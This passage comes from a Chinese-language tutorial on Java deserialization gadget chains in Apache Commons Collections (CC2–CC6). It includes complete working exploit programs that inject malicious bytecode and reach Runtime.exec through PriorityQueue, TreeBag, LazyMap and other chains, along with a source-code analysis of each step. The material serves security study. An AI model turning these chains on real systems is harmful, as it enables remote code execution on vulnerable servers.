            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (LinkageError e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }

    /**
     * This method generates an instance of the translet class that is
     * wrapped inside this Template. The translet instance will later
     * be wrapped inside a Transformer object.
     */
    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;//5

            if (_class == null) defineTransletClasses();//2

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//4
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setOverrideDefaultParser(_overrideDefaultParser);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }

    /**
     * Implements JAXP's Templates.newTransformer()
     *
     * @throws TransformerConfigurationException
     */
    public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);//1

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
```

注释1处调用了getTransletInstance，分析getTransletInstance。

注释2处调用了defineTransletClasses，在defineTransletClasses里注释3处，会解析类的字节码_bytecodes，_bytecodes就是之后我们构造的包含payload的类的字节码。

回到注释4处，程序会为我们传入的恶意TemplatesImpl类创建一个实例，里面的静态代码包含的payload就会在此时执行。

ps1：

在构造时我们还需要注意两点：

* 注释4处，创建的是一个AbstractTranslet示例，因此我们的恶意类要继承一下AbstractTranslet
* 注释5处，我们构造时需要给_name赋一个任意的值，不然后面的代码不会执行

ps2：

q：为什么不直接在InvokerTransformer#transform里调用getTransletInstance？

a：因为getTransletInstance是私有方法

于是有Exp中的构造：

```java
    String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
    String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

    ClassPool classPool=ClassPool.getDefault();//返回默认的类池
    classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
    CtClass payload=classPool.makeClass("CommonsCollections22222222222");//创建一个新的public类
    payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
    payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); //创建一个空的类初始化，设置构造函数主体为runtime

    byte[] bytes=payload.toBytecode();//转换为byte数组

    Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
    Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段
    field.setAccessible(true);//暴力反射
    field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组

    Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段
    field1.setAccessible(true);//暴力反射
    field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test
```

‍

##### TransformingComparator

```java
    /** The decorated comparator. */
    private final Comparator<O> decorated;
    /** The transformer being used. */
    private final Transformer<? super I, ? extends O> transformer;

    public TransformingComparator(Transformer<? super I, ? extends O> transformer) {
        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
    }

	/**
     * Returns the result of comparing the values from the transform operation.
     *
     * @param obj1  the first object to transform then compare
     * @param obj2  the second object to transform then compare
     * @return negative if obj1 is less, positive if greater, zero if equal
     */
    public int compare(final I obj1, final I obj2) {
        final O value1 = this.transformer.transform(obj1);//1
        final O value2 = this.transformer.transform(obj2);//2
        return this.decorated.compare(value1, value2);
    }
```

commons-collections4 4.0中，LazyMap和TransformedMap没有了decorate方法，选择TransformingComparator的compare触发。

在构造时，transformer传入的应该是InvokerTransformer实例。

##### PriorityQueue

```java
    private final Comparator<? super E> comparator;
	transient Object[] queue

    /**
     * Inserts item x at position k, maintaining heap invariant by
     * demoting x down the tree repeatedly until it is less than or
     * equal to its children or is a leaf.
     *
     * @param k the position to fill
     * @param x the item to insert
     */
    private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);//2
        else
            siftDownComparable(k, x);
    }
    @SuppressWarnings("unchecked")
    private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)//1
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }

    /**
     * Establishes the heap invariant (described above) in the entire tree,
     * assuming nothing about the order of the elements prior to the call.
     */
    @SuppressWarnings("unchecked")
    private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);//3
    }

    /**
     * Reconstitutes the {@code PriorityQueue} instance from a stream
     * (that is, deserializes it).
     *
     * @param s the stream
     */
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i < size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();//4
    }
```

阅读源码可知PriorityQueue在反序列化readObject时，会按照注释中4、3、2、1标注的顺序，维护一个桶排序树合法。

接下来就是要如何构造comparator和queue了。

根据注释1处，我们知道comparator应该是TransformingComparator的一个实例。

根据TemplatesImpl和InvokerTransformer的分析，我们知道queue应该是TemplatesImpl实例数组。

于是有Exp中的构造：

```java
    InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
    TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
    PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
    queue.add(1);//
    queue.add(2);//占位用

    Field field2=queue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段
    field2.setAccessible(true);//暴力反射
    field2.set(queue,comparator);//设置queue的comparator字段值为comparator

    Field field3=queue.getClass().getDeclaredField("queue");//获取queue的queue字段
    field3.setAccessible(true);//暴力反射
    field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl
```

#### 问题补充

##### queue占位

Q1：

```java
    PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
    queue.add(1);//1
    queue.add(2);//2
```

注释1、2处，为何需要这两行代码？

A1：

我们看PriorityQueue的readObject函数：

```java
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i < size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();
    }
```

若无这两行代码，则创建的queue的size属性为0。

这会导致反序列化时queue为空。

因此Exp也可以改为：

```java
    PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
    Field field4=queue.getClass().getDeclaredField("size");//获取PriorityQueue的size字段
    field4.setAccessible(true);//暴力反射
    field4.set(queue,2);//设置queue的comparator字段值为comparator
```

Q2：

为何要用1、2占位，不能直接add`templatesImpl`​？

A2:

因为会报错：

​`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable`​

而利用反射时

```java
    Field field3=queue.getClass().getDeclaredField("queue");//获取queue的queue字段
    field3.setAccessible(true);//暴力反射
    field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl
```

Java并不会检查是否合法，而在反序列化时，由于payload执行早于排序，因此不影响。

##### quenue反序列化

Q：

PriorityQueue的queue已经使用transient关键字修饰，为什么还能从流中反序列化queue中的元素？

A：

[序列化规范](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/output.html#a861 "序列化规范")允许待序列化的类实现writeObject方法，实现对自己的成员控制权。

### TreeBag&TreeMap链

#### Exp展示

```java
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2T {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
        CtClass payload=classPool.makeClass("CommonsCollections22222222222");//创建一个新的public类
        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); //创建一个空的类初始化，设置构造函数主体为runtime

        byte[] bytes=payload.toBytecode();//转换为byte数组

        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段
        field.setAccessible(true);//暴力反射
        field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组

        Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段
        field1.setAccessible(true);//暴力反射
        field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test

        InvokerTransformer transformer=new InvokerTransformer("toString",new Class[]{},new Object[]{});
        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象

        TreeBag tb = new TreeBag(comparator);
        tb.add(templatesImpl);

        Field field2 = InvokerTransformer.class.getDeclaredField("iMethodName");
        field2.setAccessible(true);
        field2.set(transformer, "newTransformer");

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        outputStream.writeObject(tb);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
        inputStream.readObject();
    }
}

```

#### Exp构造分析

##### 利用链展示

```java
Gadget chain:
		ObjectInputStream.readObject()
			TreeBag.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
```

主要分析一下TreeBag和PriorityQueue的不同。

##### TreeBag

```java
    public TreeBag(Comparator<? super E> comparator) {
        super(new TreeMap(comparator));//1
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Comparator<? super E> comp = (Comparator)in.readObject();
        super.doReadObject(new TreeMap(comp), in);//2
    }
```

如注释1处所示，TreeBag创建实例时，还会创建一个TreeMap实例，并且它的排序方法由我们定义。

因此我们可以在Exp中创建TreeBag传入我们的恶意排序方法。

如注释2处所示，TreeBag在反序列化时，我们构造的恶意排序方法同样也反序列化了。

接着我们跟进一下注释2处的代码，AbstractMapBag.doReadObject()。

##### AbstractMapBag

```java
    protected void doReadObject(Map<E, MutableInteger> map, ObjectInputStream in) throws IOException, ClassNotFoundException {
        this.map = map;
        int entrySize = in.readInt();

        for(int i = 0; i < entrySize; ++i) {
            E obj = in.readObject();
            int count = in.readInt();
            map.put(obj, new MutableInteger(count));//1
            this.size += count;
        }

    }
```

程序在注释1处执行了TreeMap.put()，我们看一下对应方法。

##### TreeMap

```java
    public V put(K key, V value) {
        Entry<K,V> t = root;
        if (t == null) {
            compare(key, key); // type (and possibly null) check

            root = new Entry<>(key, value, null);
            size = 1;
            modCount++;
            return null;
        }
        int cmp;
        Entry<K,V> parent;
        // split comparator and comparable paths
        Comparator<? super K> cpr = comparator;
        if (cpr != null) {
            do {
                parent = t;
                cmp = cpr.compare(key, t.key);
                if (cmp < 0)
                    t = t.left;
                else if (cmp > 0)
                    t = t.right;
                else
                    return t.setValue(value);
            } while (t != null);
        }
        else {
            if (key == null)
                throw new NullPointerException();
            @SuppressWarnings("unchecked")
                Comparable<? super K> k = (Comparable<? super K>) key;
            do {
                parent = t;
                cmp = k.compareTo(t.key);
                if (cmp < 0)
                    t = t.left;
                else if (cmp > 0)
                    t = t.right;
                else
                    return t.setValue(value);
            } while (t != null);
        }
        Entry<K,V> e = new Entry<>(key, value, parent);
        if (cmp < 0)
            parent.left = e;
        else
            parent.right = e;
        fixAfterInsertion(e);
        size++;
        modCount++;
        return null;
    }
```

可以看到这里触发了我们构造的恶意排序方法。

后面的流程则和PriorityQueue链相同，不再赘述。

#### 问题补充

##### 用toString初始化

Q：

为什么Exp中的`InvokerTransformer transformer=new InvokerTransformer("toString",new Class[]{},new Object[]{});`​不直接用`InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});`​呢？

A：

我们构造的恶意排序方法其实是不能正常排序的，如果用newTransformer作为入参构造，则在Exp的`tb.add(templatesImpl)`​就会报错，原因看源码：

```java
    //TreeBag源码
	public boolean add(E object) {
        if (this.comparator() == null && !(object instanceof Comparable)) {
            throw new IllegalArgumentException("Objects of type " + object.getClass() + " cannot be added to " + "a naturally ordered TreeBag as it does not implement Comparable");
        } else {
            return super.add(object);
        }
    }

	//AbstractTreeBag源码
    public boolean add(E object) {
        return this.add(object, 1);
    }

    public boolean add(E object, int nCopies) {
        ++this.modCount;
        if (nCopies > 0) {
            MutableInteger mut = (MutableInteger)this.map.get(object);
            this.size += nCopies;
            if (mut == null) {
                this.map.put(object, new MutableInteger(nCopies));
                return true;
            } else {
                mut.value += nCopies;
                return false;
            }
        } else {
            return false;
        }
    }
```

由源码可知，`tb.add(templatesImpl)`​会触发我们的恶意排序，如果用newTransformer作为入参构造，则此处报错。

因此先使用toString作为入参构造，使代码运行通过`tb.add(templatesImpl)`​，后面再通过反射把toString改为newTransformer。

##### newTransformer构造报错原因

```java
    //TemplatesImpl源码
	private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//1
            translet.postInitialization();//2
            translet.setTemplates(this);
            translet.setOverrideDefaultParser(_overrideDefaultParser);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

程序在执行到注释1处时，触发了我们的恶意代码。

而在注释2处发生了空指针报错：

​![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20241009181730-h1lb8bd.png)​

## CommonsCollections3

### 版本适用范围

Commons-Collections 3.1-3.2.1

Java JDK < 8u71

### Exp展示

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections333333333");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");

        byte[] bytes=payload.toBytecode();

        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templatesImpl,new byte[][]{bytes});

        Field field1=templatesImpl.getClass().getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templatesImpl,"test");


        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        Map map=new HashMap();
        Map lazyMap= LazyMap.decorate(map,chainedTransformer);

        Class cls=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);

        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);
        Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);
        Object object=constructor.newInstance(Override.class,map1);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        outputStream.writeObject(object);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
        inputStream.readObject();
    }
}
```

### Exp构造分析

CommonsCollections3是CommonsCollections1和CommonsCollections2的组合改造版。

涉及的新类有InstantiateTransformer和TrAXFilter。

#### 利用链展示

```java
AnnotationInvocationHandler.readObject()
   Map(Proxy).entrySet()
        AnnotationInvocationHandler.invoke()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()//1
                        InstantiateTransformer.transform()//2
                            TemplatesImpl.newTransformer()
```

前半部分是CommonsCollections1的LazyMap利用链，后半部分是CommonsCollections2的利用链。

#### TrAXFilter

在利用链注释1处会得到一个TrAXFilter类。

```java
    public TrAXFilter(Templates templates) throws TransformerConfigurationException {
        this._templates = templates;
        this._transformer = (TransformerImpl)templates.newTransformer();//1 漏洞利用点
        this._transformerHandler = new TransformerHandlerImpl(this._transformer);
        this._useServicesMechanism = this._transformer.useServicesMechnism();
    }
```

根据ChainedTransformer.transform()的源码得知，这个类会作为InstantiateTransformer.transform()的入参。

#### InstantiateTransformer

```java
    public Object transform(Object input) {
        try {
            if (!(input instanceof Class)) {
                throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName()));
            } else {
                Constructor con = ((Class)input).getConstructor(this.iParamTypes);
                return con.newInstance(this.iArgs);//1 漏洞利用点
            }
        } catch (NoSuchMethodException var6) {
            throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
        } catch (InstantiationException var7) {
            throw new FunctorException("InstantiateTransformer: InstantiationException", var7);
        } catch (IllegalAccessException var8) {
            throw new FunctorException("InstantiateTransformer: Constructor must be public", var8);
        } catch (InvocationTargetException var9) {
            throw new FunctorException("InstantiateTransformer: Constructor threw an exception", var9);
        }
    }
```

this.iArgs的值为我们构造的templatesImpl，程序在注释1出实际执行的是templatesImpl.newTransformer()，后面的利用原理和CommonsCollections2类似，不再赘述。

## CommonsCollections4

### 版本适用范围

commons-collections4 4.0

### Exp展示

```java
import  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
public class CommonsCollections4 {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections44444444");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");

        byte[] bytes = payload.toBytecode();

        Object templates = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();

        Field field=templates.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templates,new byte[][]{bytes});

        Field name=templates.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"test");

        Transformer[] trans = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates})
        };// 主要是这里的变化
        ChainedTransformer chain = new ChainedTransformer(trans);
        TransformingComparator transCom = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);
        Field com = PriorityQueue.class.getDeclaredField("comparator");
        com.setAccessible(true);
        com.set(queue,transCom);
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
        inputStream.readObject();
    }
}
```

### Exp构造分析

其实就是CommonsCollections2和CommonsCollections3的组合

#### 利用链展示

```java
Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()//1
						ChainedTransformer.transform()
                    		ConstantTransformer.transform()
                        		InstantiateTransformer.transform()
                            		TemplatesImpl.newTransformer()
```

注释1之前是CommonsCollections2的利用。

在TransformingComparator.compare()中触发this.transformer.transform(obj1)，后面就是CommonsCollections3的利用。

### 问题补充

#### 是否能用TreeBag&TreeMap构造

Q：

是否能类似CommonsCollections2一样，利用TreeBag&TreeMap构造呢？

A：

我觉得很难，理由如下：

​`tb.add(templatesImpl)`​会触发我们的恶意排序。

因此CommonsCollections2中，先使用toString作为入参构造，使代码运行通过`tb.add(templatesImpl)`​，后面再通过反射把toString改为newTransformer。

而在此处却很难实现。

我尝试不使用`tb.add(templatesImpl)`​，而使用反射给size和map赋值，这样可以规避add的执行，但可以把等同的状态赋给实例。

size容易解决，但是map却很难解决。

源码中map的定义如下：

​` private transient Map<E, MutableInteger> map;`​

MutableInteger是AbstractMapBag内部的一个protected类。

```java
    protected static class MutableInteger {
        protected int value;

        MutableInteger(int value) {
            this.value = value;
        }

        public boolean equals(Object obj) {
            if (!(obj instanceof MutableInteger)) {
                return false;
            } else {
                return ((MutableInteger)obj).value == this.value;
            }
        }

        public int hashCode() {
            return this.value;
        }
    }
```

这就很难搞了，因为我们无法从外部获取到MutableInteger。

因此我认为很难再使用TreeBag&TreeMap构造了。

## CommonsCollections5

### 版本适用范围

Commons-Collections 3.1-3.2.1

jdk without a security manager

### Exp展示

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class CommonsCollections5 {
    public static void main(String[] args) throws Exception {
        Transformer Testtransformer = new ChainedTransformer(new Transformer[]{});

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,Testtransformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(123);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);

        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(Testtransformer, transformers);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc5.out"));
        outputStream.writeObject(poc);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc5.out"));
        inputStream.readObject();
    }
}

```

### Exp构造分析

#### 利用链展示

```java
Gadget chain:
		ObjectInputStream.readObject()
			BadAttributeValueExpException.readObject()
				TiedMapEntry.toString()
					LazyMap.get()
						ChainedTransformer.transform()
                    		ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
```

#### BadAttributeValueExpException

```java
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();//1
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
```

分析一下BadAttributeValueExpException.readObject()源码，因为SecurityManager是默认关闭的，因此`System.getSecurityManager() == null`​为真，程序会执行注释1处。

分析Exp，这里会触发TiedMapEntry.toString()。

#### TiedMapEntry

```java

	public String toString() {
        return this.getKey() + "=" + this.getValue();
    }
	public Object getValue() {
        return this.map.get(this.key);//1
    }
```

程序在注释1处会触发LazyMap.get()，后续的执行流程则和CommonsCollections1相同。

## CommonsCollections6

### 版本适用范围

commons-collections : 3.1～3.2.1

### Exp展示

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections6 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        Transformer Testtransformer = new ChainedTransformer(new Transformer[]{});

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Map map=new HashMap();
        Map lazyMap=LazyMap.decorate(map,Testtransformer);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"cc6");

        HashSet hashSet=new HashSet(1);
        hashSet.add(tiedMapEntry);
        lazyMap.remove("cc6");

        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(Testtransformer, transformers);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("cc6.out"));
        objectOutputStream.writeObject(hashSet);
        objectOutputStream.close();

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("cc6.out"));
        objectInputStream.readObject();

    }
}
```

### Exp构造分析

#### 利用链展示

```java
HashSet.readObject()/HashMap.readObject()
    HashMap.put()
        HashMap.hash()
            TiedMapEntry.hashCode()
                LazyMap.get()
                    ChainedTransformer.transform()
                        InvokerTransformer.transform()
```

#### HashSet

```java
    private void readObject(java.io.ObjectInputStream s)
